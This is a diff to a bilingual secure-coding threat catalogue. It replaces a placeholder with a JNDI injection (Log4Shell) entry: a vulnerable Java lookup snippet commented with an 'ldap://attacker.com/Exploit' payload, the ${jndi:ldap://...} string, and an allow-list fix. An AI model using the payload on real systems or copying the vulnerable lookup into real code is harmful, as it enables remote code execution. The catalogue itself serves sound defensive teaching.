@@ -789,28 +789,24 @@ threats:
 
     '
 - id: cat_1_research10
-  name: Jndi injection (java naming and directory interface)
-  severity: Medium
+  name: JNDI Injection (Log4Shell)
+  severity: Critical
   difficulty: Unknown
-  confidence: RESEARCH
-  cwe: []
-  desc: 'Zagrożenie wymaga weryfikacji — zostało zidentyfikowane tylko przez jeden model AI. Opis: potencjalne zagrożenie typu "Jndi injection (java naming and directory interface)" wskazane w analizie arena.
+  confidence: POSSIBLE
+  cwe:
+  - CWE-917
+  - CWE-502
+  desc: JNDI zostało zaprojektowane, by pobierać i tworzyć instancje zdalnych obiektów Java — przekazanie niezaufanego stringa do InitialContext.lookup() (albo, jak w Log4Shell, zalogowanie stringa zawierającego ${jndi:ldap://...}) powoduje pobranie i wykonanie zdalnej klasy. To nie klasyczna składnia do ominięcia — to nadużycie funkcji działającej dokładnie tak jak zaprojektowano. CVE-2021-44228 uzyskało idealne CVSS 10.0.
+  desc_en: JNDI is designed to fetch and instantiate remote Java objects — passing untrusted input into InitialContext.lookup() (or, as in Log4Shell, merely logging a string containing ${jndi:ldap://...}) causes a remote class to be fetched and executed. This isn't syntax to escape — it's abuse of a feature working exactly as built. CVE-2021-44228 scored a perfect CVSS 10.0.
+  lang: java
+  vuln: '// VULNERABLE
+
+    String name = request.getParameter("resource");   // attacker-controlled
+
+    Object obj = new InitialContext().lookup(name);    // ldap://attacker.com/Exploit -> RCE
 
     '
-  desc_en: 'This threat requires verification — it was identified by only one AI model. Description: potential threat of this type indicated in the arena analysis.'
-  lang: unknown
-  vuln: '# Wymaga weryfikacji — brak przykładu kodu
-
-    # To zagrożenie pojawił się tylko u jednego modelu AI
-
-    # Potrzebny dalszy research przed dodaniem przykładu
-
-    '
-  safe: '# Brak zweryfikowanego przykładu bezpiecznego kodu
-
-    # Po weryfikacji zagrożenia zostanie dodany przykład
-
-    '
+  safe: "// SECURE — allow-list logical names, never let scheme/host be user-controlled\nprivate static final Set<String> ALLOWED = Set.of(\"jdbc/AppDB\", \"jdbc/ReportDB\");\nString name = request.getParameter(\"resource\");\nif (!ALLOWED.contains(name)) {\n    throw new SecurityException(\"Disallowed JNDI name\");\n}\nObject obj = new InitialContext().lookup(name);\n"
 - id: cat_1_research11
   name: XML External Entity (XXE) Injection
   severity: Critical
